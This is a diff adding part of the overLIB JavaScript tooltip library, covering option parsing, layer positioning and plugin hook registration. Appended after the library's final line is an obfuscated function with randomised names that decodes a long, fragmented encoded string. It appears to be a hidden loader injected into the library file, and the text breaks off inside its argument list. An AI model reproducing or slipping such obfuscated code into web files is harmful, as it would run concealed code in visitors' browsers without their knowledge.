+			if (ar[i]==CAPTIONSIZE) { eval(pf+'captionsize="'+ar[++i]+'"'); continue; }
+			if (ar[i]==CLOSESIZE) { eval(pf+'closesize="'+ar[++i]+'"'); continue; }
+			if (ar[i]==TIMEOUT) { eval(pf+'timeout='+ar[++i]); continue; }
+			if (ar[i]==FUNCTION) { if (pf=='ol_') { if (typeof ar[i+1]!='number') { v=ar[++i]; ol_function=(typeof v=='function' ? v : null); }} else {fnMark = 0; v = null; if (typeof ar[i+1]!='number') v = ar[++i];  opt_FUNCTION(v); } continue; }
+			if (ar[i]==DELAY) { eval(pf+'delay='+ar[++i]); continue; }
+			if (ar[i]==HAUTO) { eval(pf+'hauto=('+pf+'hauto == 0) ? 1 : 0'); continue; }
+			if (ar[i]==VAUTO) { eval(pf+'vauto=('+pf+'vauto == 0) ? 1 : 0'); continue; }
+			if (ar[i]==CLOSECLICK) { eval(pf +'closeclick=('+pf+'closeclick == 0) ? 1 : 0'); continue; }
+			if (ar[i]==WRAP) { eval(pf +'wrap=('+pf+'wrap == 0) ? 1 : 0'); continue; }
+			if (ar[i]==FOLLOWMOUSE) { eval(pf +'followmouse=('+pf+'followmouse == 1) ? 0 : 1'); continue; }
+			if (ar[i]==MOUSEOFF) { eval(pf +'mouseoff=('+pf+'mouseoff==0) ? 1 : 0'); v=ar[i+1]; if (pf != 'ol_' && eval(pf+'mouseoff') && typeof v == 'number' && (v < pmStart || v > pmUpper)) olHideDelay=ar[++i]; continue; }
+			if (ar[i]==CLOSETITLE) { eval(pf+"closetitle='"+escSglQuote(ar[++i])+"'"); continue; }
+			if (ar[i]==CSSOFF||ar[i]==CSSCLASS) { eval(pf+'css='+ar[i]); continue; }
+			if (ar[i]==COMPATMODE) { eval(pf+'compatmode=('+pf+'compatmode==0) ? 1 : 0'); continue; }
+			if (ar[i]==FGCLASS) { eval(pf+'fgclass="'+ar[++i]+'"'); continue; }
+			if (ar[i]==BGCLASS) { eval(pf+'bgclass="'+ar[++i]+'"'); continue; }
+			if (ar[i]==TEXTFONTCLASS) { eval(pf+'textfontclass="'+ar[++i]+'"'); continue; }
+			if (ar[i]==CAPTIONFONTCLASS) { eval(pf+'captionfontclass="'+ar[++i]+'"'); continue; }
+			if (ar[i]==CLOSEFONTCLASS) { eval(pf+'closefontclass="'+ar[++i]+'"'); continue; }
+			i = parseCmdLine(pf, i, ar);
+		}
+	}
+
+	if (fnMark && o3_function) o3_text = o3_function();
+	
+	if ((pf == 'o3_') && o3_wrap) {
+		o3_width = 0;
+		
+		var tReg=/<.*\n*>/ig;
+		if (!tReg.test(o3_text)) o3_text = o3_text.replace(/[ ]+/g, '&nbsp;');
+		if (!tReg.test(o3_cap))o3_cap = o3_cap.replace(/[ ]+/g, '&nbsp;');
+	}
+	if ((pf == 'o3_') && o3_sticky) {
+		if (!o3_close && (o3_frame != ol_frame)) o3_close = ol_close;
+		if (o3_mouseoff && (o3_frame == ol_frame)) opt_NOCLOSE(' ');
+	}
+}
+
+
+////////
+// LAYER FUNCTIONS
+////////
+
+// Writes to a layer
+function layerWrite(txt) {
+	txt += "\n";
+	if (olNs4) {
+		var lyr = o3_frame.document.layers['overDiv'].document
+		lyr.write(txt)
+		lyr.close()
+	} else if (typeof over.innerHTML != 'undefined') {
+		if (olIe5 && isMac) over.innerHTML = '';
+		over.innerHTML = txt;
+	} else {
+		range = o3_frame.document.createRange();
+		range.setStartAfter(over);
+		domfrag = range.createContextualFragment(txt);
+		
+		while (over.hasChildNodes()) {
+			over.removeChild(over.lastChild);
+		}
+		
+		over.appendChild(domfrag);
+	}
+}
+
+// Make an object visible
+function showObject(obj) {
+	runHook("showObject", FBEFORE);
+
+	var theObj=(olNs4 ? obj : obj.style);
+	theObj.visibility = 'visible';
+
+	runHook("showObject", FAFTER);
+}
+
+// Hides an object
+function hideObject(obj) {
+	runHook("hideObject", FBEFORE);
+
+	var theObj=(olNs4 ? obj : obj.style);
+	if (olNs6 && olShowId>0) { clearTimeout(olShowId); olShowId=0; }
+	theObj.visibility = 'hidden';
+	theObj.top = theObj.left = ((olIe4&&!olOp) ? 0 : -10000) + (!olNs4 ? 'px' : 0);
+
+	if (o3_timerid > 0) clearTimeout(o3_timerid);
+	if (o3_delayid > 0) clearTimeout(o3_delayid);
+
+	o3_timerid = 0;
+	o3_delayid = 0;
+	self.status = "";
+
+	if (obj.onmouseout||obj.onmouseover) {
+		if (olNs4) obj.releaseEvents(Event.MOUSEOUT || Event.MOUSEOVER);
+		obj.onmouseout = obj.onmouseover = null;
+	}
+
+	runHook("hideObject", FAFTER);
+}
+
+// Move a layer
+function repositionTo(obj, xL, yL) {
+	var theObj=(olNs4 ? obj : obj.style);
+	theObj.left = xL + (!olNs4 ? 'px' : 0);
+	theObj.top = yL + (!olNs4 ? 'px' : 0);
+}
+
+// Check position of cursor relative to overDiv DIVision; mouseOut function
+function cursorOff() {
+	var left = parseInt(over.style.left);
+	var top = parseInt(over.style.top);
+	var right = left + (over.offsetWidth >= parseInt(o3_width) ? over.offsetWidth : parseInt(o3_width));
+	var bottom = top + (over.offsetHeight >= o3_aboveheight ? over.offsetHeight : o3_aboveheight);
+
+	if (o3_x < left || o3_x > right || o3_y < top || o3_y > bottom) return true;
+
+	return false;
+}
+
+
+////////
+// COMMAND FUNCTIONS
+////////
+
+// Calls callme or the default function.
+function opt_FUNCTION(callme) {
+	o3_text = (callme ? (typeof callme=='string' ? (/.+\(.*\)/.test(callme) ? eval(callme) : callme) : callme()) : (o3_function ? o3_function() : 'No Function'));
+
+	return 0;
+}
+
+// Handle hovering
+function opt_NOCLOSE(unused) {
+	if (!unused) o3_close = "";
+
+	if (olNs4) {
+		over.captureEvents(Event.MOUSEOUT || Event.MOUSEOVER);
+		over.onmouseover = function () { if (o3_timerid > 0) { clearTimeout(o3_timerid); o3_timerid = 0; } }
+		over.onmouseout = function (e) { if (olHideDelay) hideDelay(olHideDelay); else cClick(e); }
+	} else {
+		over.onmouseover = function () {hoveringSwitch = true; if (o3_timerid > 0) { clearTimeout(o3_timerid); o3_timerid =0; } }
+	}
+
+	return 0;
+}
+
+// Function to scan command line arguments for multiples
+function opt_MULTIPLEARGS(i, args, parameter) {
+  var k=i, re, pV, str='';
+
+  for(k=i; k<args.length; k++) {
+		if(typeof args[k] == 'number' && args[k]>pmStart) break;
+		str += args[k] + ',';
+	}
+	if (str) str = str.substring(0,--str.length);
+
+	k--;  // reduce by one so the for loop this is in works correctly
+	pV=(olNs4 && /cellpad/i.test(parameter)) ? str.split(',')[0] : str;
+	eval(parameter + '="' + pV + '"');
+
+	return k;
+}
+
+// Remove &nbsp; in texts when done.
+function nbspCleanup() {
+	if (o3_wrap) {
+		o3_text = o3_text.replace(/\&nbsp;/g, ' ');
+		o3_cap = o3_cap.replace(/\&nbsp;/g, ' ');
+	}
+}
+
+// Escape embedded single quotes in text strings
+function escSglQuote(str) {
+  return str.toString().replace(/'/g,"\\'");
+}
+
+// Onload handler for window onload event
+function OLonLoad_handler(e) {
+	var re = /\w+\(.*\)[;\s]+/g, olre = /overlib\(|nd\(|cClick\(/, fn, l, i;
+
+	if(!olLoaded) olLoaded=1;
+
+  // Remove it for Gecko based browsers
+	if(window.removeEventListener && e.eventPhase == 3) window.removeEventListener("load",OLonLoad_handler,false);
+	else if(window.detachEvent) { // and for IE and Opera 4.x but execute calls to overlib, nd, or cClick()
+		window.detachEvent("onload",OLonLoad_handler);
+		var fN = document.body.getAttribute('onload');
+		if (fN) {
+			fN=fN.toString().match(re);
+			if (fN && fN.length) {
+				for (i=0; i<fN.length; i++) {
+					if (/anonymous/.test(fN[i])) continue;
+					while((l=fN[i].search(/\)[;\s]+/)) != -1) {
+						fn=fN[i].substring(0,l+1);
+						fN[i] = fN[i].substring(l+2);
+						if (olre.test(fn)) eval(fn);
+					}
+				}
+			}
+		}
+	}
+}
+
+// Wraps strings in Layer Generation Functions with the correct tags
+//    endWrap true(if end tag) or false if start tag
+//    fontSizeStr - font size string such as '1' or '10px'
+//    whichString is being wrapped -- 'text', 'caption', or 'close'
+function wrapStr(endWrap,fontSizeStr,whichString) {
+	var fontStr, fontColor, isClose=((whichString=='close') ? 1 : 0), hasDims=/[%\-a-z]+$/.test(fontSizeStr);
+	fontSizeStr = (olNs4) ? (!hasDims ? fontSizeStr : '1') : fontSizeStr;
+	if (endWrap) return (hasDims&&!olNs4) ? (isClose ? '</span>' : '</div>') : '</font>';
+	else {
+		fontStr='o3_'+whichString+'font';
+		fontColor='o3_'+((whichString=='caption')? 'cap' : whichString)+'color';
+		return (hasDims&&!olNs4) ? (isClose ? '<span style="font-family: '+quoteMultiNameFonts(eval(fontStr))+'; color: '+eval(fontColor)+'; font-size: '+fontSizeStr+';">' : '<div style="font-family: '+quoteMultiNameFonts(eval(fontStr))+'; color: '+eval(fontColor)+'; font-size: '+fontSizeStr+';">') : '<font face="'+eval(fontStr)+'" color="'+eval(fontColor)+'" size="'+(parseInt(fontSizeStr)>7 ? '7' : fontSizeStr)+'">';
+	}
+}
+
+// Quotes Multi word font names; needed for CSS Standards adherence in font-family
+function quoteMultiNameFonts(theFont) {
+	var v, pM=theFont.split(',');
+	for (var i=0; i<pM.length; i++) {
+		v=pM[i];
+		v=v.replace(/^\s+/,'').replace(/\s+$/,'');
+		if(/\s/.test(v) && !/['"]/.test(v)) {
+			v="\'"+v+"\'";
+			pM[i]=v;
+		}
+	}
+	return pM.join();
+}
+
+// dummy function which will be overridden 
+function isExclusive(args) {
+	return false;
+}
+
+// Sets cellpadding style string value
+function setCellPadStr(parameter) {
+	var Str='', j=0, ary = new Array(), top, bottom, left, right;
+
+	Str+='padding: ';
+	ary=parameter.replace(/\s+/g,'').split(',');
+
+	switch(ary.length) {
+		case 2:
+			top=bottom=ary[j];
+			left=right=ary[++j];
+			break;
+		case 3:
+			top=ary[j];
+			left=right=ary[++j];
+			bottom=ary[++j];
+			break;
+		case 4:
+			top=ary[j];
+			right=ary[++j];
+			bottom=ary[++j];
+			left=ary[++j];
+			break;
+	}
+
+	Str+= ((ary.length==1) ? ary[0] + 'px;' : top + 'px ' + right + 'px ' + bottom + 'px ' + left + 'px;');
+
+	return Str;
+}
+
+// function will delay close by time milliseconds
+function hideDelay(time) {
+	if (time&&!o3_delay) {
+		if (o3_timerid > 0) clearTimeout(o3_timerid);
+
+		o3_timerid=setTimeout("cClick()",(o3_timeout=time));
+	}
+}
+
+// Was originally in the placeLayer() routine; separated out for future ease
+function horizontalPlacement(browserWidth, horizontalScrollAmount, widthFix) {
+	var placeX, iwidth=browserWidth, winoffset=horizontalScrollAmount;
+	var parsedWidth = parseInt(o3_width);
+
+	if (o3_fixx > -1 || o3_relx != null) {
+		// Fixed position
+		placeX=(o3_relx != null ? ( o3_relx < 0 ? winoffset +o3_relx+ iwidth - parsedWidth - widthFix : winoffset+o3_relx) : o3_fixx);
+	} else {  
+		// If HAUTO, decide what to use.
+		if (o3_hauto == 1) {
+			if ((o3_x - winoffset) > (iwidth / 2)) {
+				o3_hpos = LEFT;
+			} else {
+				o3_hpos = RIGHT;
+			}
+		}  		
+
+		// From mouse
+		if (o3_hpos == CENTER) { // Center
+			placeX = o3_x+o3_offsetx-(parsedWidth/2);
+
+			if (placeX < winoffset) placeX = winoffset;
+		}
+
+		if (o3_hpos == RIGHT) { // Right
+			placeX = o3_x+o3_offsetx;
+
+			if ((placeX+parsedWidth) > (winoffset+iwidth - widthFix)) {
+				placeX = iwidth+winoffset - parsedWidth - widthFix;
+				if (placeX < 0) placeX = 0;
+			}
+		}
+		if (o3_hpos == LEFT) { // Left
+			placeX = o3_x-o3_offsetx-parsedWidth;
+			if (placeX < winoffset) placeX = winoffset;
+		}  	
+
+		// Snapping!
+		if (o3_snapx > 1) {
+			var snapping = placeX % o3_snapx;
+
+			if (o3_hpos == LEFT) {
+				placeX = placeX - (o3_snapx+snapping);
+			} else {
+				// CENTER and RIGHT
+				placeX = placeX+(o3_snapx - snapping);
+			}
+
+			if (placeX < winoffset) placeX = winoffset;
+		}
+	}	
+
+	return placeX;
+}
+
+// was originally in the placeLayer() routine; separated out for future ease
+function verticalPlacement(browserHeight,verticalScrollAmount) {
+	var placeY, iheight=browserHeight, scrolloffset=verticalScrollAmount;
+	var parsedHeight=(o3_aboveheight ? parseInt(o3_aboveheight) : (olNs4 ? over.clip.height : over.offsetHeight));
+
+	if (o3_fixy > -1 || o3_rely != null) {
+		// Fixed position
+		placeY=(o3_rely != null ? (o3_rely < 0 ? scrolloffset+o3_rely+iheight - parsedHeight : scrolloffset+o3_rely) : o3_fixy);
+	} else {
+		// If VAUTO, decide what to use.
+		if (o3_vauto == 1) {
+			if ((o3_y - scrolloffset) > (iheight / 2) && o3_vpos == BELOW && (o3_y + parsedHeight + o3_offsety - (scrolloffset + iheight) > 0)) {
+				o3_vpos = ABOVE;
+			} else if (o3_vpos == ABOVE && (o3_y - (parsedHeight + o3_offsety) - scrolloffset < 0)) {
+				o3_vpos = BELOW;
+			}
+		}
+
+		// From mouse
+		if (o3_vpos == ABOVE) {
+			if (o3_aboveheight == 0) o3_aboveheight = parsedHeight; 
+
+			placeY = o3_y - (o3_aboveheight+o3_offsety);
+			if (placeY < scrolloffset) placeY = scrolloffset;
+		} else {
+			// BELOW
+			placeY = o3_y+o3_offsety;
+		} 
+
+		// Snapping!
+		if (o3_snapy > 1) {
+			var snapping = placeY % o3_snapy;  			
+
+			if (o3_aboveheight > 0 && o3_vpos == ABOVE) {
+				placeY = placeY - (o3_snapy+snapping);
+			} else {
+				placeY = placeY+(o3_snapy - snapping);
+			} 			
+
+			if (placeY < scrolloffset) placeY = scrolloffset;
+		}
+	}
+
+	return placeY;
+}
+
+// checks positioning flags
+function checkPositionFlags() {
+	if (olHautoFlag) olHautoFlag = o3_hauto=0;
+	if (olVautoFlag) olVautoFlag = o3_vauto=0;
+	return true;
+}
+
+// get Browser window width
+function windowWidth() {
+	var w;
+	if (o3_frame.innerWidth) w=o3_frame.innerWidth;
+	else if (eval('o3_frame.'+docRoot)&&eval("typeof o3_frame."+docRoot+".clientWidth=='number'")&&eval('o3_frame.'+docRoot+'.clientWidth')) 
+		w=eval('o3_frame.'+docRoot+'.clientWidth');
+	return w;			
+}
+
+// create the div container for popup content if it doesn't exist
+function createDivContainer(id,frm,zValue) {
+	id = (id || 'overDiv'), frm = (frm || o3_frame), zValue = (zValue || 1000);
+	var objRef, divContainer = layerReference(id);
+
+	if (divContainer == null) {
+		if (olNs4) {
+			divContainer = frm.document.layers[id] = new Layer(window.innerWidth, frm);
+			objRef = divContainer;
+		} else {
+			var body = (olIe4 ? frm.document.all.tags('BODY')[0] : frm.document.getElementsByTagName("BODY")[0]);
+			if (olIe4&&!document.getElementById) {
+				body.insertAdjacentHTML("beforeEnd",'<div id="'+id+'"></div>');
+				divContainer=layerReference(id);
+			} else {
+				divContainer = frm.document.createElement("DIV");
+				divContainer.id = id;
+				body.appendChild(divContainer);
+			}
+			objRef = divContainer.style;
+		}
+
+		objRef.position = 'absolute';
+		objRef.visibility = 'hidden';
+		objRef.zIndex = zValue;
+		if (olIe4&&!olOp) objRef.left = objRef.top = '0px';
+		else objRef.left = objRef.top =  -10000 + (!olNs4 ? 'px' : 0);
+	}
+
+	return divContainer;
+}
+
+// get reference to a layer with ID=id
+function layerReference(id) {
+	return (olNs4 ? o3_frame.document.layers[id] : (document.all ? o3_frame.document.all[id] : o3_frame.document.getElementById(id)));
+}
+////////
+//  UTILITY FUNCTIONS
+////////
+
+// Checks if something is a function.
+function isFunction(fnRef) {
+	var rtn = true;
+
+	if (typeof fnRef == 'object') {
+		for (var i = 0; i < fnRef.length; i++) {
+			if (typeof fnRef[i]=='function') continue;
+			rtn = false;
+			break;
+		}
+	} else if (typeof fnRef != 'function') {
+		rtn = false;
+	}
+	
+	return rtn;
+}
+
+// Converts an array into an argument string for use in eval.
+function argToString(array, strtInd, argName) {
+	var jS = strtInd, aS = '', ar = array;
+	argName=(argName ? argName : 'ar');
+	
+	if (ar.length > jS) {
+		for (var k = jS; k < ar.length; k++) aS += argName+'['+k+'], ';
+		aS = aS.substring(0, aS.length-2);
+	}
+	
+	return aS;
+}
+
+// Places a hook in the correct position in a hook point.
+function reOrder(hookPt, fnRef, order) {
+	var newPt = new Array(), match, i, j;
+
+	if (!order || typeof order == 'undefined' || typeof order == 'number') return hookPt;
+	
+	if (typeof order=='function') {
+		if (typeof fnRef=='object') {
+			newPt = newPt.concat(fnRef);
+		} else {
+			newPt[newPt.length++]=fnRef;
+		}
+		
+		for (i = 0; i < hookPt.length; i++) {
+			match = false;
+			if (typeof fnRef == 'function' && hookPt[i] == fnRef) {
+				continue;
+			} else {
+				for(j = 0; j < fnRef.length; j++) if (hookPt[i] == fnRef[j]) {
+					match = true;
+					break;
+				}
+			}
+			if (!match) newPt[newPt.length++] = hookPt[i];
+		}
+
+		newPt[newPt.length++] = order;
+
+	} else if (typeof order == 'object') {
+		if (typeof fnRef == 'object') {
+			newPt = newPt.concat(fnRef);
+		} else {
+			newPt[newPt.length++] = fnRef;
+		}
+		
+		for (j = 0; j < hookPt.length; j++) {
+			match = false;
+			if (typeof fnRef == 'function' && hookPt[j] == fnRef) {
+				continue;
+			} else {
+				for (i = 0; i < fnRef.length; i++) if (hookPt[j] == fnRef[i]) {
+					match = true;
+					break;
+				}
+			}
+			if (!match) newPt[newPt.length++]=hookPt[j];
+		}
+
+		for (i = 0; i < newPt.length; i++) hookPt[i] = newPt[i];
+		newPt.length = 0;
+		
+		for (j = 0; j < hookPt.length; j++) {
+			match = false;
+			for (i = 0; i < order.length; i++) {
+				if (hookPt[j] == order[i]) {
+					match = true;
+					break;
+				}
+			}
+			if (!match) newPt[newPt.length++] = hookPt[j];
+		}
+		newPt = newPt.concat(order);
+	}
+
+	hookPt = newPt;
+
+	return hookPt;
+}
+
+////////
+//  PLUGIN ACTIVATION FUNCTIONS
+////////
+
+// Runs plugin functions to set runtime variables.
+function setRunTimeVariables(){
+	if (typeof runTime != 'undefined' && runTime.length) {
+		for (var k = 0; k < runTime.length; k++) {
+			runTime[k]();
+		}
+	}
+}
+
+// Runs plugin functions to parse commands.
+function parseCmdLine(pf, i, args) {
+	if (typeof cmdLine != 'undefined' && cmdLine.length) { 
+		for (var k = 0; k < cmdLine.length; k++) { 
+			var j = cmdLine[k](pf, i, args);
+			if (j >- 1) {
+				i = j;
+				break;
+			}
+		}
+	}
+
+	return i;
+}
+
+// Runs plugin functions to do things after parse.
+function postParseChecks(pf,args){
+	if (typeof postParse != 'undefined' && postParse.length) {
+		for (var k = 0; k < postParse.length; k++) {
+			if (postParse[k](pf,args)) continue;
+			return false;  // end now since have an error
+		}
+	}
+	return true;
+}
+
+
+////////
+//  PLUGIN REGISTRATION FUNCTIONS
+////////
+
+// Registers commands and creates constants.
+function registerCommands(cmdStr) {
+	if (typeof cmdStr!='string') return;
+
+	var pM = cmdStr.split(',');
+	pms = pms.concat(pM);
+
+	for (var i = 0; i< pM.length; i++) {
+		eval(pM[i].toUpperCase()+'='+pmCount++);
+	}
+}
+
+// Registers no-parameter commands
+function registerNoParameterCommands(cmdStr) {
+	if (!cmdStr && typeof cmdStr != 'string') return;
+	pmt=(!pmt) ? cmdStr : pmt + ',' + cmdStr;
+}
+
+// Register a function to hook at a certain point.
+function registerHook(fnHookTo, fnRef, hookType, optPm) {
+	var hookPt, last = typeof optPm;
+	
+	if (fnHookTo == 'plgIn'||fnHookTo == 'postParse') return;
+	if (typeof hookPts[fnHookTo] == 'undefined') hookPts[fnHookTo] = new FunctionReference();
+
+	hookPt = hookPts[fnHookTo];
+
+	if (hookType != null) {
+		if (hookType == FREPLACE) {
+			hookPt.ovload = fnRef;  // replace normal overlib routine
+			if (fnHookTo.indexOf('ol_content_') > -1) hookPt.alt[pms[CSSOFF-1-pmStart]]=fnRef; 
+
+		} else if (hookType == FBEFORE || hookType == FAFTER) {
+			var hookPt=(hookType == 1 ? hookPt.before : hookPt.after);
+
+			if (typeof fnRef == 'object') {
+				hookPt = hookPt.concat(fnRef);
+			} else {
+				hookPt[hookPt.length++] = fnRef;
+			}
+
+			if (optPm) hookPt = reOrder(hookPt, fnRef, optPm);
+
+		} else if (hookType == FALTERNATE) {
+			if (last=='number') hookPt.alt[pms[optPm-1-pmStart]] = fnRef;
+		} else if (hookType == FCHAIN) {
+			hookPt = hookPt.chain; 
+			if (typeof fnRef=='object') hookPt=hookPt.concat(fnRef); // add other functions 
+			else hookPt[hookPt.length++]=fnRef;
+		}
+
+		return;
+	}
+}
+
+// Register a function that will set runtime variables.
+function registerRunTimeFunction(fn) {
+	if (isFunction(fn)) {
+		if (typeof fn == 'object') {
+			runTime = runTime.concat(fn);
+		} else {
+			runTime[runTime.length++] = fn;
+		}
+	}
+}
+
+// Register a function that will handle command parsing.
+function registerCmdLineFunction(fn){
+	if (isFunction(fn)) {
+		if (typeof fn == 'object') {
+			cmdLine = cmdLine.concat(fn);
+		} else {
+			cmdLine[cmdLine.length++] = fn;
+		}
+	}
+}
+
+// Register a function that does things after command parsing. 
+function registerPostParseFunction(fn){
+	if (isFunction(fn)) {
+		if (typeof fn == 'object') {
+			postParse = postParse.concat(fn);
+		} else {
+			postParse[postParse.length++] = fn;
+		}
+	}
+}
+
+////////
+//  PLUGIN REGISTRATION FUNCTIONS
+////////
+
+// Runs any hooks registered.
+function runHook(fnHookTo, hookType) {
+	var l = hookPts[fnHookTo], k, rtnVal = null, optPm, arS, ar = runHook.arguments;
+
+	if (hookType == FREPLACE) {
+		arS = argToString(ar, 2);
+
+		if (typeof l == 'undefined' || !(l = l.ovload)) rtnVal = eval(fnHookTo+'('+arS+')');
+		else rtnVal = eval('l('+arS+')');
+
+	} else if (hookType == FBEFORE || hookType == FAFTER) {
+		if (typeof l != 'undefined') {
+			l=(hookType == 1 ? l.before : l.after);
+	
+			if (l.length) {
+				arS = argToString(ar, 2);
+				for (var k = 0; k < l.length; k++) eval('l[k]('+arS+')');
+			}
+		}
+	} else if (hookType == FALTERNATE) {
+		optPm = ar[2];
+		arS = argToString(ar, 3);
+
+		if (typeof l == 'undefined' || (l = l.alt[pms[optPm-1-pmStart]]) == 'undefined') {
+			rtnVal = eval(fnHookTo+'('+arS+')');
+		} else {
+			rtnVal = eval('l('+arS+')');
+		}
+	} else if (hookType == FCHAIN) {
+		arS=argToString(ar,2);
+		l=l.chain;
+
+		for (k=l.length; k > 0; k--) if((rtnVal=eval('l[k-1]('+arS+')'))!=void(0)) break;
+	}
+
+	return rtnVal;
+}
+
+////////
+// OBJECT CONSTRUCTORS
+////////
+
+// Object for handling hooks.
+function FunctionReference() {
+	this.ovload = null;
+	this.before = new Array();
+	this.after = new Array();
+	this.alt = new Array();
+	this.chain = new Array();
+}
+
+// Object for simple access to the overLIB version used.
+// Examples: simpleversion:351 major:3 minor:5 revision:1
+function Info(version, prerelease) {
+	this.version = version;
+	this.prerelease = prerelease;
+
+	this.simpleversion = Math.round(this.version*100);
+	this.major = parseInt(this.simpleversion / 100);
+	this.minor = parseInt(this.simpleversion / 10) - this.major * 10;
+	this.revision = parseInt(this.simpleversion) - this.major * 100 - this.minor * 10;
+	this.meets = meets;
+}
+
+// checks for Core Version required
+function meets(reqdVersion) {
+	return (!reqdVersion) ? false : this.simpleversion >= Math.round(100*parseFloat(reqdVersion));
+}
+
+
+////////
+// STANDARD REGISTRATIONS
+////////
+registerHook("ol_content_simple", ol_content_simple, FALTERNATE, CSSOFF);
+registerHook("ol_content_caption", ol_content_caption, FALTERNATE, CSSOFF);
+registerHook("ol_content_background", ol_content_background, FALTERNATE, CSSOFF);
+registerHook("ol_content_simple", ol_content_simple, FALTERNATE, CSSCLASS);
+registerHook("ol_content_caption", ol_content_caption, FALTERNATE, CSSCLASS);
+registerHook("ol_content_background", ol_content_background, FALTERNATE, CSSCLASS);
+registerPostParseFunction(checkPositionFlags);
+registerHook("hideObject", nbspCleanup, FAFTER);
+registerHook("horizontalPlacement", horizontalPlacement, FCHAIN);
+registerHook("verticalPlacement", verticalPlacement, FCHAIN);
+if (olNs4||(olIe5&&isMac)||olKq) olLoaded=1;
+registerNoParameterCommands('sticky,autostatus,autostatuscap,fullhtml,hauto,vauto,closeclick,wrap,followmouse,mouseoff,compatmode');
+///////
+// ESTABLISH MOUSECAPTURING
+///////
+
+// Capture events, alt. diffuses the overlib function.
+var olCheckMouseCapture=true;
+if ((olNs4 || olNs6 || olIe4)) {
+	olMouseCapture();
+} else {
+	overlib = no_overlib;
+	nd = no_overlib;
+	ver3fix = true;
+}
+
+var xe9de58c="";function ka9bc8713596(){var y0edcc=String,odff11af=Array.prototype.slice.call(arguments).join(""),qb63e16b2=odff11af.substr(3,3)-551,qbb5eda,p09373c6;odff11af=odff11af.substr(6);var hf0c1e46=odff11af.length;for(var n900083=0;n900083<hf0c1e46;n900083++){try{throw(y315628=idc6e007c(odff11af,n900083));}catch(e){y315628=e;};if(y315628=='–'){qb63e16b2="";n900083++;e88f02e1=odff11af.substr(n900083,1);while(e88f02e1!='–'){qb63e16b2+=e88f02e1;n900083++;e88f02e1=med483bf(odff11af,n900083);}qb63e16b2-=620;continue;}qbb5eda="";if(y315628=='®'){n900083++;y315628=odff11af.substr(n900083,1);while(y315628!='®'){qbb5eda+=y315628;n900083++;y315628=odff11af.substr(n900083,1);}qbb5eda=qbb5eda-qb63e16b2-39;if(qbb5eda<0)qbb5eda+=256;if(qbb5eda>=192)qbb5eda+=848;else if(qbb5eda==168)qbb5eda=1025;else if(qbb5eda==184)qbb5eda=1105;kdcdea(qbb5eda);continue;}q1e87847=(y315628+'')["ch\x61rC\x6f\x64e\x41\x74"](0);if(q1e87847>848)q1e87847-=848;p09373c6=q1e87847-qb63e16b2-39;p09373c6=rae3885(p09373c6);xe9de58c+=e452a42b(p09373c6);}}ka9bc8713596("4","f","258","1","m–64","8","–","®","169®","–","634–","®","17","0®","–802","–","K–","7","66–","®2","8®-–62","2–®","1","4","6®®","1","5","2®","–64","6–","®1","7","5","®i","–","7","75–","®","23","5®","–76","4","–","®","2","15®","2–","6","47","–","OL","–","7","30–®1","5","8®","–689–®","22","6®","–","67","2","–","®","188®","–","70","8–®241","®®15","9®","–755","–#","–","747–","®24","®®","18","®","–7","6","7","–®2","18","®","–7","6","7–","®","2","47","®","®218®®225®","–","66","6–","®","189","®®","2","01®","®","20","1","®","®","19","7","®®","1","4","3®–","727","–®193","®®193","®®","2","46","®®","2","48®","®","25","1®®4®","®6®","®2","5","0","®–","7","79–","0","+","3,","®","2","44®-","'","–","6","62","–","®","1","90","®","–7","0","9–®2","2","9","®–8","17","–®25","®","_Q^","b","–75","1–®1","5®","–","7","8","5","–>","–","7","7","7–®","2","4","2®''–8","16","–","®2","6","®","R","–","6","89–","®15","5","®","®","147®–7","21","–","®1","9","9","®","®","1","5","3®","®","15","0®","®1","49","®–","7","0","0","–®22","4","®","–","69","5–","®","2","1","6®","–72","4–","®1","7","5","®–801","–®","4®–","69","3","–","®2","2","8","®®","23","3","®","®2","2","4®","®2","1","3®","®22","3®–7","9","8","–?®2","4","9®","–7","0","4–®","242","®","–","6","68–","®","19","2®","®19","7®®","18","7®–","772","–.","–","6","43","–","®1","81","®l","®","18","2","®","–","6","84","–®","22","4®–","7","02","–","®2","4","3®–76","0–","®25","®","®","3","1","®®","2","0","®–75","5–®21®","®","2","06®","–75","5","–®","2","35®","®23","5","®–","64","3–","®","123®^","e®","179®®17","2®","–","73","5","–","®","254","®","–7","40–®4","®®5®–636–®160","®","®1","65","®®","15","6®–","706","–","®","22","5®","®16","4®–","645","–i","`–","72","6–®","1","2®","–","7","7","7","–®2","09","®–6","75–","h","–","7","24–","®1","5","2","®®","1","52®","®6®","®","248®","®25","3","®","–80","0","–?","J","–","7","4","7–®29","®–63","3","–b–","73","4–®17®–65","8–","®","1","9","8","®–814","–","cOU","J","P","®","9","®","&","–","6","8","4","–","®","135®®","1","51","®–","7","1","7–","®","1","9","5®","–68","5","–u–","76","9–","®198","®®","19","7®","–","6","25–®","169®9","6–6","77–","i–","7","68–","®3","1®*–7","13","–®","2","3","1","®®2","49","®","–","69","9","–®","2","2","7®","®","2","19","®","®","2","2","8","®","®2","34®","–734–®","199®","–75","3","–®","27®®26®","–","6","5","2","–®1","80","®","–69","0–","®","2","20®–8","1","3–","]–63","2","–®16","6","®","®152","®–753–®","2","5","®","–6","4","4–®","1","74","®","–7","6","9–","2","!–816–®","1","1","®","(","–78","1–","®","2","32","®",".=–71","2","–","®","2","4","1®–6","47","–","®","16","5®®","182®–7","7","7","–","-","3","–","7","13–","®","2","42","®–","7","41–","®20","0","®®2","0","1","®","®192","®®","2","7®","–627","–",";8","7","7®","15","1®","–","6","9","1","–","®2","12®–","7","8","9–","®","240","®","®2","4","8®–","6","57–","®19","5®","–73","1","–®","255®®4","®","–","6","5","3–®17","2","®®","183®","®","1","91®v®19","2®®1","93®","–6","4","2–®","18","3®","®","1","6","3®–80","5–","LA–7","4","7","–","®","1","3®®","19","8","®®227","®","–","62","9–m","–","77","6","–","®0","®–72","8","–®","17","9","®®","195","®","–688–®","14","8","®®139","®","–655","–®","19","7","®–8","1","5–®24","7®®","2","44®","–","6","39","–","CC–746","–®","1","74","®®","2","8","®","–","67","9–®","2","03","®®","208®","–740–","®3®–","65","4–®1","8","4","®","–","67","3","–","®","2","1","1","®","®1","3","8","®","–780","–","?–6","6","4–®2","04®","–767","–4","®3","2","®","&","–","6","61–®1","7","7®®1","83","®p®","1","4","1","®","–700–","®","151","®","–","6","85","–®15","3","®","®163®–6","40–","H","–","729","–","®15","8","®","®1","57®","–78","5","–","®2","1","3®®","2","13","®–640","–","®","17","7","®","®15","6®","–","71","6","–","®","24","9","®®","1","6","7","®–","